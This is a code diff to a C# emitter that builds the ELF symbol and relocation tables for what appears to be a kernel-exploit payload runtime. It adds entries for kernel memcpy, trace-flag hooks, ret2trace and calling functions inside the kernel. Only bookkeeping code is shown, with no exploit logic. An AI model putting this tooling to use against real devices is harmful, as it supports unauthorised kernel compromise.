+    private static int _getFncallAnsOff, _getFncallAnsBytes;
+    private static int _setFncallArgsOff, _setFncallArgsBytes;
+    private static int _getFncallCallbackOff, _getFncallCallbackBytes;
+    private static int _copyinR0Off, _copyoutR0Off;
     private static int _dladdrOff, _dladdrBytes;
     private static int _mdbgMemopOff, _mdbgMemopBytes;
     private static int _mdbgCopyoutOff, _mdbgCopyoutBytes;
@@ -13187,6 +14054,18 @@ public static class PayloadCrtEmitter
     private static List<Reloc> _ucredRelocs = [];
     private static List<Reloc> _mdbgRelocs = [];
     private static List<Reloc> _procioRelocs = [];
+    private static List<Reloc> _kmemcpyRelocs = [];
+    private static List<Reloc> _ret2traceRelocs = [];
+    private static List<Reloc> _runInKernelRelocs = [];
+    private static List<Reloc> _traceInitRelocs = [];
+    private static List<Reloc> _traceSetProgRelocs = [];
+    private static List<Reloc> _setTfAndGetpidRelocs = [];
+    private static List<Reloc> _getpidToFncallRelocs = [];
+    private static List<Reloc> _fncallInitRelocs = [];
+    private static List<Reloc> _getFncallAnsRelocs = [];
+    private static List<Reloc> _setFncallArgsRelocs = [];
+    private static List<Reloc> _pipeRelocs = [];
+    private static List<Reloc> _pipeReinitRelocs = [];
     private static List<Reloc> _currentRelocs = [];
 
     private enum RelocSymbol
@@ -13212,6 +14091,25 @@ public static class PayloadCrtEmitter
         NataotTcb,
         SavedFsbase,
         SavedRetaddr,
+        Kframe,
+        Uretframe,
+        TraceStart,
+        TraceEnd,
+        TraceProg,
+        TraceFrameSize,
+        FncallCpuSwitch,
+        FncallSysGetpid,
+        FncallSyscallAfter,
+        FncallFn,
+        FncallArg0,
+        FncallArg1,
+        FncallArg2,
+        FncallArg3,
+        FncallArg4,
+        FncallArg5,
+        FncallAns,
+        FncallNopRet,
+        FncallDoretiIret,
     }
 
     private readonly record struct Reloc(int Offset, RelocSymbol Sym, uint Type, long Addend);
@@ -13245,6 +14143,45 @@ public static class PayloadCrtEmitter
             int nKernelWrite = strtab.Add(KernelWriteSymbol);
             int nKernelCopyin = strtab.Add(KernelCopyinSymbol);
             int nKernelCopyout = strtab.Add(KernelCopyoutSymbol);
+            int nKfncall = strtab.Add(KfncallSymbol);
+            int nKmemcpy = strtab.Add(KmemcpySymbol);
+            int nRet2trace = strtab.Add(Ret2traceSymbol);
+            int nRunInKernel = strtab.Add(RunInKernelSymbol);
+            int nSetTf = strtab.Add(SetTfSymbol);
+            int nTraceInit = strtab.Add(TraceInitSymbol);
+            int nTraceSetProg = strtab.Add(TraceSetProgSymbol);
+            int nGetRet2trace = strtab.Add(GetRet2traceSymbol);
+            int nGetInt1Return = strtab.Add(GetInt1ReturnSymbol);
+            int nSetTfAndGetpid = strtab.Add(SetTfAndGetpidSymbol);
+            int nPipe = strtab.Add(PipeSymbol);
+            int nPipeReinit = strtab.Add(PipeReinitSymbol);
+            int nGetpidToFncall = strtab.Add(GetpidToFncallSymbol);
+            int nFncallInit = strtab.Add(FncallInitSymbol);
+            int nGetFncallAns = strtab.Add(GetFncallAnsSymbol);
+            int nSetFncallArgs = strtab.Add(SetFncallArgsSymbol);
+            int nGetFncallCallback = strtab.Add(GetFncallCallbackSymbol);
+            int nFncallCpuSwitch = strtab.Add("__sp_fncall_cpu_switch");
+            int nFncallSysGetpid = strtab.Add("__sp_fncall_sys_getpid");
+            int nFncallSyscallAfter = strtab.Add("__sp_fncall_syscall_after");
+            int nFncallFn = strtab.Add("__sp_fncall_fn");
+            int nFncallArg0 = strtab.Add("__sp_fncall_arg0");
+            int nFncallArg1 = strtab.Add("__sp_fncall_arg1");
+            int nFncallArg2 = strtab.Add("__sp_fncall_arg2");
+            int nFncallArg3 = strtab.Add("__sp_fncall_arg3");
+            int nFncallArg4 = strtab.Add("__sp_fncall_arg4");
+            int nFncallArg5 = strtab.Add("__sp_fncall_arg5");
+            int nFncallAns = strtab.Add("__sp_fncall_ans");
+            int nFncallNopRet = strtab.Add("__sp_fncall_nop_ret");
+            int nFncallDoretiIret = strtab.Add("__sp_fncall_doreti_iret");
+            int nClearTfHandler = strtab.Add(ClearTfHandlerSymbol);
+            int nGetClearTfHandler = strtab.Add(GetClearTfHandlerSymbol);
+            int nFncallInitCore = strtab.Add(FncallInitCoreSymbol);
+            int nKframe = strtab.Add(KframeSymbol);
+            int nUretframe = strtab.Add(UretframeSymbol);
+            int nTraceStart = strtab.Add(TraceStartSymbol);
+            int nTraceEnd = strtab.Add(TraceEndSymbol);
+            int nTraceProg = strtab.Add(TraceProgSymbol);
+            int nTraceFrameSize = strtab.Add(TraceFrameSizeSymbol);
             int nKernelInit = strtab.Add(KernelInitSymbol);
             int nPipeAddr = strtab.Add(PipeAddrSymbol);
             int nRwPipe0 = strtab.Add(RwPipe0Symbol);
@@ -13522,7 +14459,46 @@ public static class PayloadCrtEmitter
             const int symKernelSetUcredSceAttr0 = 194;
             const int symCrtKekcall = 195;
             const int symCrtMdbgCall = 196;
-            const int symCount = 197;
+            const int symKfncall = 197;
+            const int symKmemcpy = 198;
+            const int symRet2trace = 199;
+            const int symRunInKernel = 200;
+            const int symKframe = 201;
+            const int symUretframe = 202;
+            const int symTraceStart = 203;
+            const int symTraceEnd = 204;
+            const int symTraceProg = 205;
+            const int symTraceFrameSize = 206;
+            const int symSetTf = 207;
+            const int symTraceInit = 208;
+            const int symTraceSetProg = 209;
+            const int symGetRet2trace = 210;
+            const int symSetTfAndGetpid = 211;
+            const int symPipe = 212;
+            const int symPipeReinit = 213;
+            const int symGetpidToFncall = 214;
+            const int symFncallInit = 215;
+            const int symGetFncallAns = 216;
+            const int symSetFncallArgs = 217;
+            const int symGetFncallCallback = 218;
+            const int symFncallCpuSwitch = 219;
+            const int symFncallSysGetpid = 220;
+            const int symFncallSyscallAfter = 221;
+            const int symFncallFn = 222;
+            const int symFncallArg0 = 223;
+            const int symFncallArg1 = 224;
+            const int symFncallArg2 = 225;
+            const int symFncallArg3 = 226;
+            const int symFncallArg4 = 227;
+            const int symFncallArg5 = 228;
+            const int symFncallAns = 229;
+            const int symFncallNopRet = 230;
+            const int symFncallDoretiIret = 231;
+            const int symClearTfHandler = 232;
+            const int symGetClearTfHandler = 233;
+            const int symFncallInitCore = 234;
+            const int symGetInt1Return = 235;
+            const int symCount = 236;
 
             byte[] symtab = new byte[24 * symCount];
             WriteSym(symtab, symStart, nStart, GlobalFunc, shText, (ulong)_startOff, (ulong)_startBytes);
@@ -13545,6 +14521,7 @@ public static class PayloadCrtEmitter
             WriteSym(symtab, symKernelWrite, nKernelWrite, GlobalFunc, shText, (ulong)_kernelWriteOff, (ulong)_kernelWriteBytes);
             WriteSym(symtab, symKernelCopyin, nKernelCopyin, GlobalFunc, shText, (ulong)_kernelCopyinOff, (ulong)_kernelCopyinBytes);
             WriteSym(symtab, symKernelCopyout, nKernelCopyout, GlobalFunc, shText, (ulong)_kernelCopyoutOff, (ulong)_kernelCopyoutBytes);
+            WriteSym(symtab, symKfncall, nKfncall, GlobalFunc, shText, (ulong)_kfncallOff, (ulong)_kfncallBytes);
             WriteSym(symtab, symKernelInit, nKernelInit, GlobalFunc, shText, (ulong)_kernelInitOff, (ulong)_kernelInitBytes);
             WriteSym(symtab, symPipeAddr, nPipeAddr, GlobalObject, shBss, BssOffPipeAddr, 8);
             WriteSym(symtab, symRwPipe0, nRwPipe0, GlobalObject, shBss, BssOffRwPipe0, 4);
@@ -13721,6 +14698,44 @@ public static class PayloadCrtEmitter
             WriteSym(symtab, symNataotTcb, nNataotTcb, GlobalObject, shBss, BssOffNataotTcb, 0x300);
             WriteSym(symtab, symSavedFsbase, nSavedFsbase, GlobalObject, shBss, BssOffSavedFsbase, 8);
             WriteSym(symtab, symSavedRetaddr, nSavedRetaddr, GlobalObject, shBss, BssOffSavedRetaddr, 8);
+            WriteSym(symtab, symKmemcpy, nKmemcpy, GlobalFunc, shText, (ulong)_kmemcpyOff, (ulong)_kmemcpyBytes);
+            WriteSym(symtab, symRet2trace, nRet2trace, GlobalFunc, shText, (ulong)_ret2traceOff, (ulong)_ret2traceBytes);
+            WriteSym(symtab, symRunInKernel, nRunInKernel, GlobalFunc, shText, (ulong)_runInKernelOff, (ulong)_runInKernelBytes);
+            WriteSym(symtab, symKframe, nKframe, GlobalObject, shBss, BssOffKframe, 8);
+            WriteSym(symtab, symUretframe, nUretframe, GlobalObject, shBss, BssOffUretframe, 8);
+            WriteSym(symtab, symTraceStart, nTraceStart, GlobalObject, shBss, BssOffTraceStart, 8);
+            WriteSym(symtab, symTraceEnd, nTraceEnd, GlobalObject, shBss, BssOffTraceEnd, 8);
+            WriteSym(symtab, symTraceProg, nTraceProg, GlobalObject, shBss, BssOffTraceProg, 8);
+            WriteSym(symtab, symTraceFrameSize, nTraceFrameSize, GlobalObject, shBss, BssOffTraceFrameSize, 8);
+            WriteSym(symtab, symSetTf, nSetTf, GlobalFunc, shText, (ulong)_setTfOff, (ulong)_setTfBytes);
+            WriteSym(symtab, symTraceInit, nTraceInit, GlobalFunc, shText, (ulong)_traceInitOff, (ulong)_traceInitBytes);
+            WriteSym(symtab, symTraceSetProg, nTraceSetProg, GlobalFunc, shText, (ulong)_traceSetProgOff, (ulong)_traceSetProgBytes);
+            WriteSym(symtab, symGetRet2trace, nGetRet2trace, GlobalFunc, shText, (ulong)_getRet2traceOff, (ulong)_getRet2traceBytes);
+            WriteSym(symtab, symGetInt1Return, nGetInt1Return, GlobalFunc, shText, (ulong)_getInt1ReturnOff, (ulong)_getInt1ReturnBytes);
+            WriteSym(symtab, symSetTfAndGetpid, nSetTfAndGetpid, GlobalFunc, shText, (ulong)_setTfAndGetpidOff, (ulong)_setTfAndGetpidBytes);
+            WriteSym(symtab, symPipe, nPipe, GlobalFunc, shText, (ulong)_pipeOff, (ulong)_pipeBytes);
+            WriteSym(symtab, symPipeReinit, nPipeReinit, GlobalFunc, shText, (ulong)_pipeReinitOff, (ulong)_pipeReinitBytes);
+            WriteSym(symtab, symGetpidToFncall, nGetpidToFncall, GlobalFunc, shText, (ulong)_getpidToFncallOff, (ulong)_getpidToFncallBytes);
+            WriteSym(symtab, symFncallInit, nFncallInit, GlobalFunc, shText, (ulong)_fncallInitOff, (ulong)_fncallInitBytes);
+            WriteSym(symtab, symGetFncallAns, nGetFncallAns, GlobalFunc, shText, (ulong)_getFncallAnsOff, (ulong)_getFncallAnsBytes);
+            WriteSym(symtab, symSetFncallArgs, nSetFncallArgs, GlobalFunc, shText, (ulong)_setFncallArgsOff, (ulong)_setFncallArgsBytes);
+            WriteSym(symtab, symGetFncallCallback, nGetFncallCallback, GlobalFunc, shText, (ulong)_getFncallCallbackOff, (ulong)_getFncallCallbackBytes);
+            WriteSym(symtab, symFncallCpuSwitch, nFncallCpuSwitch, GlobalObject, shBss, BssOffFncallCpuSwitch, 8);
+            WriteSym(symtab, symFncallSysGetpid, nFncallSysGetpid, GlobalObject, shBss, BssOffFncallSysGetpid, 8);
+            WriteSym(symtab, symFncallSyscallAfter, nFncallSyscallAfter, GlobalObject, shBss, BssOffFncallSyscallAfter, 8);
+            WriteSym(symtab, symFncallFn, nFncallFn, GlobalObject, shBss, BssOffFncallFn, 8);
+            WriteSym(symtab, symFncallArg0, nFncallArg0, GlobalObject, shBss, BssOffFncallArg0, 8);
+            WriteSym(symtab, symFncallArg1, nFncallArg1, GlobalObject, shBss, BssOffFncallArg1, 8);
+            WriteSym(symtab, symFncallArg2, nFncallArg2, GlobalObject, shBss, BssOffFncallArg2, 8);
+            WriteSym(symtab, symFncallArg3, nFncallArg3, GlobalObject, shBss, BssOffFncallArg3, 8);
+            WriteSym(symtab, symFncallArg4, nFncallArg4, GlobalObject, shBss, BssOffFncallArg4, 8);
+            WriteSym(symtab, symFncallArg5, nFncallArg5, GlobalObject, shBss, BssOffFncallArg5, 8);
+            WriteSym(symtab, symFncallAns, nFncallAns, GlobalObject, shBss, BssOffFncallAns, 8);
+            WriteSym(symtab, symFncallNopRet, nFncallNopRet, GlobalObject, shBss, BssOffFncallNopRet, 8);
+            WriteSym(symtab, symFncallDoretiIret, nFncallDoretiIret, GlobalObject, shBss, BssOffFncallDoretiIret, 8);
+            WriteSym(symtab, symClearTfHandler, nClearTfHandler, GlobalFunc, shText, (ulong)_clearTfHandlerOff, (ulong)_clearTfHandlerBytes);
+            WriteSym(symtab, symGetClearTfHandler, nGetClearTfHandler, GlobalFunc, shText, (ulong)_getClearTfHandlerOff, (ulong)_getClearTfHandlerBytes);
+            WriteSym(symtab, symFncallInitCore, nFncallInitCore, GlobalFunc, shText, (ulong)_fncallInitCoreOff, (ulong)_fncallInitCoreBytes);
 
             IReadOnlyList<Reloc> relocations = _relocations ?? [];
             byte[] relaText = new byte[24 * relocations.Count];
@@ -13790,6 +14805,25 @@ public static class PayloadCrtEmitter
                 RelocSymbol.NataotTcb => symNataotTcb,
                 RelocSymbol.SavedFsbase => symSavedFsbase,
                 RelocSymbol.SavedRetaddr => symSavedRetaddr,
+                RelocSymbol.Kframe => symKframe,
+                RelocSymbol.Uretframe => symUretframe,
+                RelocSymbol.TraceStart => symTraceStart,
+                RelocSymbol.TraceEnd => symTraceEnd,
+                RelocSymbol.TraceProg => symTraceProg,
+                RelocSymbol.TraceFrameSize => symTraceFrameSize,
+                RelocSymbol.FncallCpuSwitch => symFncallCpuSwitch,
+                RelocSymbol.FncallSysGetpid => symFncallSysGetpid,
+                RelocSymbol.FncallSyscallAfter => symFncallSyscallAfter,
+                RelocSymbol.FncallFn => symFncallFn,
+                RelocSymbol.FncallArg0 => symFncallArg0,
+                RelocSymbol.FncallArg1 => symFncallArg1,
+                RelocSymbol.FncallArg2 => symFncallArg2,
+                RelocSymbol.FncallArg3 => symFncallArg3,
+                RelocSymbol.FncallArg4 => symFncallArg4,
+                RelocSymbol.FncallArg5 => symFncallArg5,
+                RelocSymbol.FncallAns => symFncallAns,
+                RelocSymbol.FncallNopRet => symFncallNopRet,
+                RelocSymbol.FncallDoretiIret => symFncallDoretiIret,
                 _ => throw new InvalidOperationException(),
             };
             for (int i = 0; i < relocations.Count; i++)
